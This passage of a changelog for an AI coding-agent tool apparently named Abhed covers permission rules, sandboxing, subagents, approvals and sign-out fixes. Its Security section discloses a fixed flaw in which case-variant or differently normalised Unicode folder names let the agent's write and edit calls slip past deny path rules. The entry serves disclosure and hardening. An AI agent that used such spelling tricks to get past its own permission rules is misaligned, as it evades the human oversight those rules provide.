  credential, as the subagent's own `action.requested` names it.
- SDK: `Options.Warn` receives what the tool set skipped or found unsafe as
  it was built: an MCP server or extension that did not start, a cluster or
  host that skips verification. `abhed rpc` and `abhed acp` write these to
  stderr, as the terminal does; their stdout stays the protocol.
- Agent definitions: markdown files whose frontmatter names a subagent role
  (`name`, `description`, `tools`, `disallowed_tools`, `model`, `max_turns`,
  `isolation`, `permission_mode`) and whose body is its instructions. They
  load from the managed `/etc/abhed/agents`, then a workspace's
  `.abhed/agents` when the workspace is trusted for that content, then
  `agents.dirs` (default `~/.abhed/agents`); a higher level wins a name and
  the shadowed file is named. `task` and `tasks` offer them beside the
  built-in roles, on every surface (the SDK with `ConfiguredTools`; `eval`
  keeps the built-in roles). See the new guide, Agent definitions.
- Every key only narrows: a tool the session lacks refuses the spawn and is
  named, `permission_mode` (`plan` or `default`) applies only where it
  narrows, `max_turns` caps the role and binds the call, a `worktree` role
  gets its own checkout. The built-in names are reserved. A key concerning
  authority that Abhed does not honour (`hooks`, `mcpServers`,
  `permissions`, allow or deny keys, sandbox settings), a wider mode, or a
  model that is not a configured provider refuses the definition.
- A subagent may run on another configured provider: `model` on the `task`
  and `tasks` calls, or in a definition. It is a provider name, never an
  endpoint; on a server only a provider sessions may run on. A model that
  cannot be had refuses the call, with no fallback and no spawn counted. The
  `model` property is offered only when more than one provider is.
- Configuration keys `agents.dirs` (never from an untrusted workspace file)
  and `agents.disabled` (an untrusted file may set it only to true).
- `POST /v1/admin/agents/reload` reads the definitions again for sessions
  started afterwards; a running session keeps the set it started with.
- `subagent.spawned` records `definition`, `definition_source`,
  `definition_sha256`, `tools`, `model` and `provider`; `subagent.returned`
  records `model` and `provider`.
- `abhed trust grant -agents-sha256 H`. The trust report (ACP, rpc, SDK)
  gains `agents`, `agents_sha256`, `agents_trusted`, `agents_reason` and
  `agents_problems`; the config package adds `GrantReviewed`,
  `RecordDecision` and `RefreshAgents`.

### Changed

- The interactive CLI:
  - Esc stops a running turn and never swallows the next key; Ctrl-C clears
    the line, then stops a turn, and at an empty prompt pressed twice exits.
  - On a terminal the per-reply usage line and the "steering" notices are
    gone: the footer and the input box carry them. Piped sessions print
    them as before.
  - Redraws send only what changed: typing at the end of the line is one
    byte a key where the whole prompt was redrawn before, and a resize
    redraws the screen at the new width rather than leaving the old one's
    rows behind.
  - The startup banner keeps each fact on one row at narrow widths.

- The CLI, the server, `rpc`, `acp`, `eval` and the SDK build their tools,
  system prompt, loop settings and budget in one place, so a surface differs
  from the CLI only where it says why. The server now applies
  `limits.max_tokens`. `abhed eval` runs with memory files, the `todo` list
  and subagents, and without MCP servers, extensions, rag corpora, the code
  index, Kubernetes and SSH, so a score does not depend on what those reach.
- `/resume` and the console refuse a subagent's session id; its work goes on
  through the session that started it. The CLI names that session when the
  record carries it, and the console answers as for an unknown session.
- A skill pipeline's input is the request its own loop is answering, and its
  model steps run on that loop's current model. It was the last CLI prompt,
  process-wide, and the model the CLI started with.
- `bash`'s description says whether commands can reach the network. When
  the sandbox has none and a command fails for that reason, the result ends
  with a note saying so and pointing at `web_search` and `web_fetch`. A
  model that ran `curl` in a sandbox with no network was given no reason
  for the failure.
- The system prompt names only the web tools the session has. It told the
  model to use `web_search` when search was off. `web_search`'s description
  pointed at a fetch tool that did not exist; it now names `web_fetch` when
  that is on.
- The CLI's and `eval`'s `bash` now know whether `sandbox.allow_network` is
  set, as the server's already did.
- `abhed serve` and `abhed doctor` report web fetch, and the console's
  overview shows it.
- Workspace trust covers `.abhed/agents` with a hash of its own, decided
  apart from `config.json`: the prompt, `abhed trust` and `abhed doctor` show
  each definition's name, model and tools, and declining new definitions
  keeps a file already trusted. A trust record from an earlier version
  decides nothing about definitions, so a workspace without them is not
  asked again. A definition that is a link, has a second name or is larger
  than 64 KiB is refused.
- `agent_type` on `task` and `tasks` is an enum of the session's agent types,
  and the `task` description lists each with when to use it.
- Skills are read by a frontmatter reader shared with agent definitions;
  they parse as before.
- An agent definition's key reads the same quoted or not. A key that reads
  like an honoured one (such as `denied_tools`), or a restriction nested under
  another key, refuses the definition. A managed definition's name stays
  reserved even when that file does not load, and its model binds the call.
  `disallowed_tools` removes every tool a name could mean, `recall` too.
- The event stream of a session with background tasks running stays open
  past its run's end, until the closing end.
- The interactive CLI follows a conversation's events for as long as it is
  open, not per task.

## [1.2.1] - 2026-09-28

### Upgrading

- Migrate first. Every deployment with two database roles, including one
  that signs in only through OIDC, must run `abhed migrate` as the owner
  before starting 1.2.1. The new column is `users.revocations`, a count of
  sign-outs everywhere, and the server refuses to start without it and says
  so. With a single role the server migrates itself. The migration is safe
  while 1.2.0 servers still run. Existing accounts start at 0.
- Cross-server sign-out needs every server on 1.2.1. A 1.2.0 server ignores
  the count during a rolling upgrade, so its sessions stay live.
- Mixed versions must not share one users file. A `users.json` file gains
  the count the first time an account in it is signed out everywhere; a
  1.2.0 server or `abhed user` command that rewrites the file drops it, and
  sessions it should end on other servers then stay live.
- A custom `auth.UserStore` must store `User.Revocations` and never lower it
  in `Put`. A sign-out everywhere through a store that does not keep it now
  returns an error instead of succeeding.
- `(*LocalAuth).RevokeUser` now writes to the account store, with a
  10-second limit of its own. `POST /v1/admin/users/admin` removing rights
  can answer `200` with a `warning` instead of `204` (see Changed).
- SDK: `SetModel` records the switch as a `model.switched` event and can now
  return an error when the record refuses it; the model is then left as it
  was. The new SDK exports are `EvModelCall`, `EvModelSwitched`, `ModelCall`
  and `ModelSwitched`.

### Added

All of it is additive. Records written before it resume on the model they
did; one that cannot say which of several providers it ran on now records
that it continues on the default (see Fixed).

- The record: a `model.switched` event (`provider`, `model`, `from`), a
  `model` field on `model.call`, and a `session.started` event (`origin`
  `chat`, `provider`, `model`, `mode`, `workspace`) at the start of every
  session the server starts, as workbench sessions already had.
- `GET /v1/sessions` gives each session's `model` and, while it is live on
  the server answering, its `provider`.
- `POST /v1/sessions/{id}/model` answers with `from` beside `provider` and
  `model`, and reopens a session this server does not hold instead of
  answering `404`.
- HawkEYE: `Report.Models` and `Turn.Model` (`models` and `turns[].model` in
  JSON), shown in the text, HTML and workbench views.
- The SDK: `EvModelCall`, `EvModelSwitched`, `ModelCall` and `ModelSwitched`.
- A model picker in the workbench. In it and in the console's, a model two
  configured providers serve is labelled `name · model`, and a switch note
  names the providers when the record does.
- In `auth`: `(*LocalAuth).RevokeUserContext`, which is `RevokeUser` that
  also returns an error when the sign-out could not be recorded for other
  servers; `User.Revocations`, which the account stores keep (never lowered
  by a write) and which is not sent in API responses; `RevokingUserStore`, a
  store that raises the count in one step, which the memory, file and
  Postgres stores implement; `store.Postgres.AddRevocation`, the Postgres
  store's one-step raise; and `LocalAuth.Log`, where `RevokeUser` logs what
  it cannot return.

### Changed

- The model pickers and `GET /v1/providers` list only configured providers.
  The built-in `local` provider (Ollama) is listed only when it is the
  default or a configuration file names it; `-model local` still works.
  The listed providers are the only ones a session can be started on or
  switched to: the API answers `400` for any other, and a record naming one
  continues on the default and records the move. `config.Config.Offered`
  reports which providers are listed.
- `agent.Loop` gains `ManualRefused`, which records a person's action that a
  policy denial refused before it reached `ManualAs`.
- The guide says that `delete(...)` and `rename(...)` rules bind the
  Explorer, not `rm` or `mv` in the terminal or the agent's `bash`, which
  `bash(...)` rules judge, and the security posture no longer calls the
  server single-node: several servers can share one Postgres, with no
  automatic failover.
- `(*LocalAuth).RevokeUser` now writes to the account store, with a
  10-second limit of its own, and logs a failure to `LocalAuth.Log` (new;
  `slog.Default()` when unset) instead of returning it. A caller on a
  request path should use `RevokeUserContext` with the request's context.
- `POST /v1/admin/users/admin` removing rights answers `200` with
  `sessions_ended`, `"signed_out_everywhere": false` and a `warning` when
  the sign-out could not be recorded for other servers, instead of `204`;
  the audit detail then carries `revocation_error`. Success is still `204`.

### Fixed

- An Explorer change to a session another server is running answered `500`
  "the change could not be recorded" instead of `409` "the session is being
  continued elsewhere", as a save does. Nothing was changed either way.
- An Explorer change refused by a `write(...)` rule was not recorded, while
  one refused by a `delete(...)` rule was. The attempt (`mkdir`, `rename` or
  `delete`, with its paths) and the policy's denial are now in the record,
  and the reply is still `403`. On a server that is not running the
  session, which cannot record the refusal, it answers `409` "the session is
  being continued elsewhere", as a `delete(...)` refusal does, and any other
  failure to record the refusal answers `500`.
- Switching the model now takes effect everywhere. The console started a new
  chat on the default whatever the picker showed; a session continued from
  its record (after a restart, on another node, or opened again in the
  workbench) went back to the default model; subagents kept the model the
  CLI started with after `/model`; the system prompt went on naming the old
  model; and in the console a failed switch reset the picker to the default
  instead of the model in use. A session no longer held in memory can be
  switched rather than answering `404`. The workbench has the picker too.
- The record names the model that answered: each `model.call` carries
  `model`, a switch is recorded as `model.switched`, the Postgres session row
  and the session list follow the switch, the CLI records a session started
  after `/model` under the model chosen, and HawkEYE lists the models used.
  A switch that cannot be recorded is refused and says so.
- A chat started on a provider that serves the same model as the default
  (for example two gateways for `gpt-4o`) continued on the default after a
  restart, and nothing recorded the move. The record of every session the
  server starts now names its provider, and a continued session keeps it. A session
  whose recorded provider is no longer configured continues on the default,
  and its next turn records the move. So does a record from before this
  release, which names only a model, when no single configured provider
  serves that model, including the default's model when another provider
  serves it too.

### Security

- On a disk that ignores case (macOS and Windows by default), another
  spelling of a folder got past path rules: deleting `core/VAULT` or renaming
  `core/Vault` from the Explorer got past `delete(**/vault/**)`, making
  `ops/FROZEN/new` got past `write(**/frozen/**)`, and the agent's `write`
  got to `core/VAULT/x` past `write(**/vault/**)` and its `edit` past
  `edit(**/vault/**)`. Deny and ask path rules are now also matched against
  the path as the disk spells it: each part that exists under the name the
  disk holds, in case and Unicode form, and a part not made yet as given,
  under its folder's real name. Allow rules still compare case as written.
  `tools.DiskPath` gives that spelling. The fix is verified on macOS, where
  a CI job runs the case tests and fails if any skips; it builds for
  Windows, but no CI job runs it there yet.
- A deny or ask path rule whose name was written in another Unicode form
  than the disk holds protected nothing: `write(**/café/**)` pasted in NFD,
  as Finder copies a name, let a write into an NFC `café/` through. Deny and
  ask path patterns are now also compared with the pattern and the path both
  in NFC, which only adds matches. Allow patterns are compared as written,
  since on a disk that keeps Unicode form the two spellings are two
  folders. A pattern's case is still not folded: on macOS and Windows, write
  a path rule in the case the disk holds the name (see the permissions
  guide).
- A sign-out everywhere ended the person's sessions only on the server that
  handled the request. With several servers sharing one Postgres account
  store, their sessions on the others stayed live. In Community, removing
  administrator rights through `POST /v1/admin/users/admin` signs the person
  out everywhere; it covers local accounts, in a users file or Postgres, and
  `abhed user` commands in the CLI keep the count when they rewrite an
  account. The Team edition adds the admin page's "Sign out everywhere", a
  password reset from the admin page, and an account refused by the access
  gate, each through `auth.LocalAuth.RevokeUser`. The sign-out is now
  recorded with the account (a failure to record it is logged, and reported
  by `RevokeUserContext` and the admin-rights endpoint), and every server
  ends that person's older sessions on its next read of the account: on
  Postgres within `accountRecheck`, about 2 seconds, and with a users file
  as soon as the file changes. A sign-in after the sign-out is not affected.
  As before, a terminal or event stream already open is checked only when
  it opens.
- An administrator's password reset made while a read of the same account
  was in flight could have that read clear the new must-change flag on this
  server's live sessions until their next read. The reset now voids reads
  in flight, and a read that overlapped a change no longer sets the flag.

## [1.2.0] - 2026-09-28

### Upgrading

- Abhed refuses to start when a `.abhed` state file in any folder above the
  workspace, such as the repository root's `.abhed/config.json` for a run
  started in a subfolder, has a second name (a hard link). Above the
  workspace only `.abhed/users.json`, `config.json` and `secrets.json` that
  you own or can write count, and world-writable sticky folders such as
  `/tmp` are skipped, so another user's file there cannot block your start.
  Remove the extra name, or give the file a single name with
  `cp -p f f.new && mv f.new f`.
- A policy hook or extension screening the Explorer's `delete` and `rename`
  actions is now asked about every entry inside a folder (up to the walk's
  5,000 entries), not only the folder. A rename's old paths are also put to
  it as `delete` actions, since a rename removes them. After duplicates are
  dropped each entry is put up to 12 times for a folder rename (named and
  with links followed, with and without a trailing `/`, as a `rename` at the
  old and the new path and as a `delete` at the old) and up to 4 for a folder
  delete, so a large rename can mean about 60,000 policy decisions; a hook
  that makes a network call per decision makes it slow.
- `POST /logout` with `Accept: application/json` answers
  `200 {"next": "<where to go>"}` instead of the redirect, which is how the
  pages now sign out. A form post without that header still redirects.
- A `403` from `auth.Middleware.Check` (for example a member dropped from
  `auth.require_group`) carries `"refused": true` beside `error` and
  `reason`, and sets a short-lived `abhed_refused` cookie that holds the
  reason for the sign-in page. The body is no longer all strings: a client
  that decodes it into a string-only map (`map[string]string` in Go) must
  decode `refused` as a boolean or ignore it.
- A subagent (`task`, `tasks`) now asks whoever its parent asks. In the
  interactive CLI its destructive commands, ask-rule matches and default-mode
  asks come to your prompt, naming the subagent, one at a time when several
  subagents run; in
  `-p` they are refused as `headless`, as the parent's own would be. A
  scripted `-p` run that relied on a subagent running such a command must
  allow it with a rule, or run it in the parent. An "Always allow" chosen
  earlier in the session covers a subagent's calls too. With
  `limits.nested_subagents` off, the default, a subagent's own `task` or
  `tasks` call is refused.
- A relative path rule now matches. If you wrote one such as `write(docs/**)`
  and relied on it not firing, it will now refuse or ask; check your rules.
- On macOS and Windows, program names in `bash(...)` rules are compared
  without case, so `bash(Make test)` also allows `make test`.
- More git commands confirm in every mode: a subcommand git does not have,
  such as a repository alias or an extension like `git lfs`, any
  `git update-ref`, `git read-tree -u` and `git checkout-index -f`. In
  `bypass`, `auto` and under an allow rule these now ask, and no allow rule
  or scope can approve them; headless `-p` refuses them.
- An allow path rule matches only where a call lands, so `write(notes/**)`
  no longer allows a path in `notes/` that is a link elsewhere, and a
  relative allow rule applies to the workspace only, not added directories.
- For the same reason, an absolute allow rule written with a spelling that
  resolves elsewhere now asks: `/var/…` or `/tmp/…` on macOS (which resolve
  to `/private/…`), or a project reached through a link. This only
  tightens; write the rule with the resolved path.
- In `plan` mode, a destructive or ask-rule command is refused as plan mode
  instead of being put to you.
- The interactive CLI keeps one conversation, and one session record, across
  the tasks you type, as `/model`, `/fork` and the docs already said: a later
  task sees what was said before it. The turn limit now counts the whole
  conversation, and the CLI says so when a task hits it; `/clear` starts a
  new conversation and a new session, and `/cost`, `/diff` and `/undo` start
  over with it.
  `/resume <id>` now continues the session's conversation, where it used to
  only replay it, and `/export`, `/tree` and `/hawkeye` cover every task in
  the session, not only the last. `/fork`, in the CLI and the SDK's
  `Agent.Fork`, records a `conversation.forked` event, so a later fork or
  resume does not bring back the branch it abandoned. For an SDK embedder
  this means `Agent.Fork` writes that event into their store, so `Events()`
  includes it, and it refuses a step an earlier fork abandoned or one past
  the end; `Fork(0)` still keeps the whole conversation.
- An unknown `-mode` exits 2, like any other bad invocation; it exited 1.
- The `write` tool now makes a new file's missing folders itself, so in
  `accept-edits` and `auto` a new file in a new folder no longer asks for a
  shell `mkdir`. A policy that relied on `write` being unable to create
  folders should add a `write(...)` deny or ask rule for those paths.
- Upgrade every node that shares one Postgres database together. An older
  node does not know `conversation.forked`, `observation.not_run` or the
  claim rules below, so it can rebuild a branch a fork abandoned, count calls
  that never ran, or reopen a session only being viewed.
- The interactive CLI names each new session `s-` and 24 random hex digits,
  where it used `s-<unix seconds>-<task>`; a script that parsed the old form
  should treat the id as opaque. On Postgres, creating a session whose id is
  already recorded is now an error (`store.ErrSessionExists`), and so is
  writing a different event at a step another writer already recorded; a
  replay of the same event still succeeds. That second error is
  `store.ErrStepTaken`, and the memory store (and so the SDK) now refuses
  such an append the same way. `abhed -p` also uses a random session id and
  exits 1 when it cannot record its session.
- A resumed session's `session.ended` totals (`tokens_in`, `tokens_out`,
  `tokens_cached`, `compactions`) now go on from its record, as `turns`
  already did, in the CLI and when the server continues a session; they
  restarted from zero.
- On the process tier a command or workbench shell can start at most
  `sandbox.max_procs` (512 by default) more processes than your user already
  runs; a build that needs more, such as a very wide `make -j`, fails to
  fork past it. Raise `max_procs` if it does.
- The Explorer's New folder, rename and delete are recorded as `mkdir`,
  `rename` and `delete` actions instead of `bash` calls, and `bash(...)`
  rules no longer apply to them. To stop a delete from the Explorer, write a
  rule for the action, such as `delete(**/keep/**)`, which also stops a
  rename of `keep` or a move out of it, or a `write(...)` rule on the path.
  A policy hook or extension that screened these as `bash`
  calls now sees `mkdir`, `rename` or `delete`, with the path in `path`
  (and a rename's new name in `to`).
- Isolated subagents (`tasks` with `"isolation": "worktree"`) and
  `abhed resolve` now make their worktrees in `<repository>/.abhed-worktrees/`
  instead of `.abhed/worktrees/`, and add `/.abhed-worktrees/` to
  `.git/info/exclude`. Worktrees left under `.abhed/worktrees/` by an earlier
  version are no longer used; remove them with `git worktree remove --force
  <path>` (or delete the folder and run `git worktree prune`) and delete their
  `abhed/<id>` or `abhed/issue-<n>` branches.
- Abhed no longer starts when a state file (`.abhed/config.json`,
  `users.json`, the secrets file, or another file under `.abhed/`) has more
  than one name. Find the other name with `find / -xdev -samefile <file>` and
  remove it, or run `cp -p <file> <file>.new && mv <file>.new <file>`.
  `abhed doctor` now fails, rather than reporting ready, when the sandbox
  cannot be built.
- "Always allow" is no longer offered for `git restore`, `git checkout`,
  `git stash` (except `git stash list` and `git stash show`), `cp`, `mv`,
  `uniq` or `tree`; approve those once, or write a rule. Nor is it offered on
  a call that matched an ask rule, and a scope chosen earlier no longer
  satisfies one, so an ask rule such as the console's `web_search` asks every
  time. More git commands now confirm as destructive in every mode, `bypass`
  and allow rules included: `git restore` of the working tree, `git checkout`
  with a pathspec or `-f`, `git switch --discard-changes` or `-f`,
  `git stash drop` and `clear`, `git branch -d`, `-D`, `-f`, `-M` and `-C`,
  `git tag -d` and `-f`, `git worktree remove -f`, any `git clean` but a dry
  run, `git push -f`, `--delete`, `--mirror` or a `+`/`:` refspec, and
  `--output` on any git command (`git diff`, `log`, `show`, `stash show`,
  `stash list` and the rest), with long options shortened too. In a run with
  no one to approve (`-p`, CI, the SDK) these are now refused where an allow
  rule used to run them.
- A reviewer's approval, and a command the person ran at the workbench, are
  now recorded as `actor: user`, as a reviewer's refusal already was, where
  they were `actor: system`; a filter on `actor: system` for approvals no
  longer counts them. `by` is unchanged.
- An SDK approver that remembers scopes should check `Decision.Offer()`, not
  `Decision.Scope`: it is empty for a call that must ask every time.
- In `auth`, `MemoryUserStore.Delete` and `FileUserStore.Delete` now return
  `ErrNoSuchUser` for an account that does not exist, where they returned
  nil, as the Postgres store already did. `SetGroups` now reaches the
  account's live sessions on their next request, and a local session whose
  account was removed is ended on its next request.
- While the account store cannot be read, a request carrying a local session
  now gets `503` "could not check your sign-in", where it got `401`; the
  session is kept, and `/v1/health` and sign-out still answer.
- Signing out is now `POST /logout`. `GET /logout` shows a page with a
  Sign out button and no longer ends the session, so a bookmark or a script
  that fetched it must post instead; a POST from another origin is refused.
  The console, the workbench and the account page already post.
- `auth.require_group` now applies once someone is signed in, and no longer
  to the sign-in page, sign-in, sign-out, `/v1/whoami` or `/v1/health`, which
  it used to refuse to everyone, members included. A signed-in person outside
  the group is signed out and gets the reason: a browser on the front page,
  an API client as `403` with `error` saying which group is missing.
- `abhed user add` now flags the account's password as one to change at first
  sign-in, with or without `-password`, as the documentation said it did. An
  operator creating their own first account sets a new password at
  `/account` once signed in.
- `abhed user remove` of an account that does not exist now prints
  "no such user" and exits 1, where it printed "removed" and exited 0.
- `abhed user add`, `passwd` and `import` refuse a `users_file` that `serve`
  refuses to start with, with the same message, where they used to write it.
- `abhed -p` stopped by a hang-up (SIGHUP) now ends its run and exits 130,
  as for Ctrl-C and SIGTERM; the signal used to end it outright, and the
  shell saw 129.
- `npm install` and `npm test`, `go`, `make`, `cargo`, `kubectl`, `yarn`,
  `pnpm`, interpreters, package runners and any command behind a `VAR=value`
  assignment no longer get a one-click "Always allow"; approve them once
  instead. Allow rules in the configuration and `-allow` flags match exactly
  as before, and a remembered "Always allow" only ever lasted one session, so
  nothing saved is lost. To keep the old flow, write the rule yourself, such
  as `bash(go test*)`, inside a sandbox tier, since it approves whatever the
  agent writes into the tests or the Makefile. A refusal in a run with no one
  to approve no longer names a rule for these commands.
- `abhed resolve` pushes to the issue's repository over https, built from the
  issue URL, and ignores `-remote`. Its git runs without hooks, signing,
  filters (Git LFS included) or `GIT_*` variables; pass `-ca` rather than
  `GIT_SSL_CAINFO`. A change holding a nested repository is not committed. A
  global `insteadOf` that rewrites https to ssh now stops the push; add a
  matching `url.<https base>.pushInsteadOf` to keep pushes on https. The
  push runs outside the checkout, so `includeIf "gitdir:…"` sections of the
  global configuration no longer apply to it: use `-ca`, or host-scoped
  `http.<url>.*` settings. On the process sandbox tier, a push is refused
  when the global git configuration, or the folder it would be made in,
  lies in the run's worktree, a temp folder or a toolchain cache (a home
  directory under `/tmp`, say), and when `~/.abhed/push` is in one of those,
  is a file or a link, or is not your own (not checked on Windows). On the
  `none` tier, or in a container that mounts the home directory, the run can
  write both, and the push is not refused.
- A start with `auth.users_file` or `ABHED_SECRETS_FILE` pointing inside
  the workspace, an added directory, a temp folder or a toolchain cache is now
  refused, unless the file is under the workspace's or the home directory's
  `.abhed/`. Move it to a state directory outside them.
- The `approvals` table gains `answer_scope` and `ended_at`. With two
  database roles, run `abhed migrate` as the owner before starting the new
  server: it refuses to start on the older schema and says so. The migration
  closes the approval rows already in the table, whose turns are not waiting.
- An unbound answer (no `request_id`) to a session no node is running, or
  whose request has ended, now gets `409` instead of `204`: nothing was
  waiting on it.
- `abhed rpc`, `abhed acp` and `abhed resolve` now run `bash` in the
  configured sandbox tier, `process` by default. On a host without one
  (Linux without bubblewrap), a session no longer starts; install it, or set
  `sandbox.min_tier` to `none` for a trusted repository.
- A narrow `bash` allow rule no longer approves a chained or redirected
  command: `bash(go test*)` no longer runs `go test ./... | tee out` unasked.
  In a run with no one to approve (`-p`, CI, the SDK), such a command is now
  refused where it used to run. Split the rule into single commands, use
  `bash(*)` inside a sandbox tier, or approve interactively.
- A custom client of `POST /v1/sessions/{id}/pty` that ignores the new
  `confirm` response field fails closed: a destructive line is not run.
- Only a `bash` call that is just `cd <folder>` now carries its directory to
  the next call, for the agent and the line-by-line terminal. A chain such as
  `mkdir x && cd x` no longer does: send the `cd` as a call of its own.
- A turn waiting for approval when the server shuts down now ends with reason
  `shutdown`, not `user_interrupt`; a filter on `user_interrupt` no longer
  counts server stops.
- A client of `POST /v1/sessions/{id}/approve` should send the `request_id` of
  the `action.requested` event it answers. An answer sent with nothing pending
  now gets `409` instead of `204` (it was held and approved the next request);
  an answer recorded after its turn stopped waiting gets `200`
  `{"recorded":true,"applied":false}`; a bound answer on a node not running the
  session gets `421` with `Abhed-Session-Node`.
- `action.denied` now carries `by`, as `action.approved` does, and both say
  who settled the call: `policy`, `reviewer`, `user`, `session-scope` (with
  the remembered `scope`), `headless` or `system`. A refusal in a run with no
  one to approve (`-p`, `rpc`, an SDK run without an approver) is now
  `actor: system`, `by: headless`, with a reason starting `no approver:`,
  where it was `actor: user` and "rejected"; a filter on `actor: user` for
  reviewers' refusals no longer counts them. A call allowed by an earlier
  "always allow" is `by: session-scope`, not `by: reviewer`. A call that
  needed approval in a run that approves on its own (subagents, `abhed
  eval`) is `by: headless`, where it was `by: reviewer`.
- A request that ends while waiting for approval now records `action.denied`
  (`actor: system`, `by: system`, step `ask`); so does a call refused before
  approval because it could not succeed (step `precheck`), and a call to an
  unknown tool records `action.requested` and `action.denied` (step
  `unknown`). A consumer that pairs every request with an outcome no longer
  finds requests without one.
- A turn stopped before the model's first reply now ends as
  `user_interrupt` or `shutdown`, not `error`. A run ended by its own
  deadline, as `abhed eval` sets per task, now ends with the new reason
  `deadline` at any point, where it was `user_interrupt`: for `abhed eval`
  that is the `terminal_reason` in its report, not its exit status. For an
  embedder, `TerminalReason.ExitCode()` gives 7 for it; `abhed -p` never
  ends this way.
- A new event, `message.dropped`, records a steered message that a shutdown
  kept from being delivered. An `observation` of a `bash` call, the agent's
  or one run on a workbench terminal, now carries `sandbox`, the tier it ran
  under (`none` on the host).
- `abhed serve` now treats a hang-up (SIGHUP) as it treats SIGTERM, draining
  and ending turns, unless it was started with hang-ups ignored (`nohup`).
  `abhed -p`, the interactive CLI, `rpc`, `acp`, `eval` and `resolve` end
  their runs on Ctrl-C, SIGTERM or a hang-up. `rpc`, `acp`, `eval` and
  `resolve` then exit with 128 plus the signal's number (130, 143, 129), where
  the signal used to end them outright. `rpc` and `acp` first write the
  stopped prompt's events, its end included, and then its reply, so the reply
  is the last thing on stdout; a second signal exits at once. A stopped
  `abhed eval` runs no further task, prints no summary and writes no `-json`
  report, and a task whose run was interrupted or shut down never passes. A
  stopped `abhed resolve` keeps its worktree, as a failed run does, and says
  where. With the interactive CLI, `-p`, `eval` and `resolve`, a second
  signal after the first now ends them at once; `serve` ignores signals
  while it drains, so a second SIGTERM does not cut the drain short.
- An agent's `bash` command now runs in a session of its own, with no
  terminal. A command that reads `/dev/tty`, such as a `sudo`, `ssh` or git
  credential prompt, fails at once instead of waiting on the terminal of the
  person running the CLI; give it its input another way. On the host, an
  "Operation not permitted" result no longer carries the note that the
  sandbox denied it.
- `abhed` now refuses a word that is not a command, with exit code 2, where
  it used to open an interactive session, so `abhed version` looked like it
  had run; run a prompt with `-p`. `abhed version` now prints the version. An
  unknown `-output-format`, such as `stream-json`, exits 2 with the valid ones
  named instead of printing text: the formats are `text` and `json` (one
  event per line).
- A piped interactive session that answered an approval with an empty line
  now has to send `a` or `y`: an empty line no longer accepts.

### Added

- `subagent.action` in the parent's record: a subagent's call that was
  refused or put to an approver, with the subagent's `session`, the tool,
  its subject, and `decision`, `step`, `reason` and `by`.
  `subagent.spawned` and `subagent.returned` are now written to the parent's
  record as well as the subagent's, with the subagent's `session`, and the
  subagent's events carry the parent's session as `parent_id`. HawkEYE
  reports a subagent's refused calls (`subagent-denied`) and its allowed
  destructive commands (`subagent-destructive`), and names each subagent's
  session.
- In the SDK: `EvSubagentAction` and the `SubagentAction` payload, for the
  new `subagent.action` event. In HawkEYE's report: `subagent_actions`
  (`hawkeye.Report.SubagentActions`, of `hawkeye.SubagentAction`), the
  subagents' refused and asked-about calls, and `session` on each entry of
  `subagents` (`hawkeye.Subagent.Session`), the subagent's own record.
- In `store`: `ErrSessionExists`, returned when a session is created with an
  id already recorded, and `ErrStepTaken`, returned when a different event is
  appended at a step another writer already recorded (see Upgrading).
- The SDK exports `EvForked`, the `Forked` payload and `Live`, which drops
  the steps a fork abandoned, so a reader outside the module can follow a
  forked record.
- Two additions to the record. `conversation.forked`, with `through_seq`,
  marks a fork: the steps between that step and the marker are kept for
  audit and left out of every rebuild. An `observation` with `not_run` set
  answers an approved call its turn ended before running; HawkEYE does not
  count it as run.
- `GET /v1/sessions` gives a `done` session a `reason`: how its last run
  ended, as recorded (`completed`, `user_interrupt`, `shutdown`, `deadline`,
  `stalled` and so on). `state` is unchanged.
- `config.Config.SetKeys`, the settings any configuration file set, as
  dotted paths, and `Config.Sets` to ask about one, whatever value the file
  gave it.
- `action.approved` and `action.denied` answered by a person carry
  `approver`, the signed-in subject who answered in the console or over the
  API, and an approval carries `granted_scope`, the scope the person chose to
  always allow with it. HawkEYE and the workbench's chat line name the
  approver. In the SDK: `Answer.Approver`, `Answer.Granted` and
  `Decision.Offer()`.
- In `auth`: `ErrSamePassword`, which `(*LocalAuth).ChangePassword` returns
  when the new password equals the current one.
- In `auth`: `VersionedUserStore`, an account store that can say whether
  any account changed, implemented by `MemoryUserStore.Version` and
  `FileUserStore.Version`; `(*LocalAuth).CheckNewUser`, which reports why an
  account could not be created without creating it; `(*LocalAuth).Verify`
  and `ErrAccountUnchecked`, to tell an account store that cannot answer from
  a sign-in that ended; and `(*LocalAuth).HasSession`.
- In the SDK: `NoteAnswer` and `Answer`, for an approver to say who settled
  a call when no person was asked, and the `By` values it takes
  (`ByPolicy`, `ByReviewer`, `ByUser`, `BySessionScope`, `ByHeadless`,
  `BySystem`); `DroppedMessage` and `EvMessageDropped` for the new
  `message.dropped` event; `TermDeadline` for the new `deadline` terminal
  reason. See [the SDK guide](docs/guide/09-sdk.md#who-settled-a-call).
- `Agent.Flush` in the SDK waits until `OnEvent` has returned for every
  event recorded before the call, or its context ends. `OnEvent` is now
  given every event, in order, however slow it is; before, events recorded
  while it was busy could be dropped, and so could one recorded the moment
  `New` returned. Give `Flush` a deadline, and do not call it from `OnEvent`.
- The line-by-line workbench terminal completes a file or folder name on Tab,
  from the workspace listing and relative to the terminal's directory; a
  second Tab lists the candidates. Nothing is run to complete. Names are
  quoted as bash quotes them, and a name with control, invisible or
  text-direction characters is never offered, so a completed line runs as
  it reads; nothing is completed inside an open quote, open backticks or
  an open `$(`. Ctrl \` leaves the terminal from the keyboard, now that Tab
  stays in it.

### Changed

- `(*auth.LocalAuth).RevokeUser` matches the username without regard to case,
  as sign-in already does, so revoking `Alice` also ends `alice`'s sessions.
- `server.ApprovalStore` changed for the approval fixes below: `AnswerApproval`
  takes the answer's scope, `ApprovalResult` returns it, and `EndApproval` is
  new. `store.Postgres` implements the new methods, and `store.Approval` gains
  `AnswerScope` and `Ended`. A store written against the old interface must
  add them.
- `agent.NewUndoLog` takes the functions that restore and remove a file;
  both are required, and the CLI and the server pass the session's
  `RestoreFile` and `RemoveFile`. Undo without them refuses rather than
  writing by path.
- `sandbox.Policy` gains `StatePaths`, the state files a configuration keeps
  outside `.abhed/`, which the process sandbox also denies to commands. A
  start with one where commands can write is refused (see Security).

### Fixed

- No sign-out control worked in Chrome: the workbench's Sign out and Switch,
  the console's, the account page's and the `GET /logout` page's button all
  posted a form, which Chrome sends as `Origin: null` under the server's
  `Referrer-Policy: no-referrer`, and the origin check refused it. They now
  sign out with a same-origin `fetch` and go where the answer says, which
  keeps an identity provider's own sign-out. The origin check also accepts
  `Origin: null` when the browser says `Sec-Fetch-Site: same-origin`, so the
  confirm page's form works without script.
- The console's session pill kept saying RUNNING through a drain: it changed
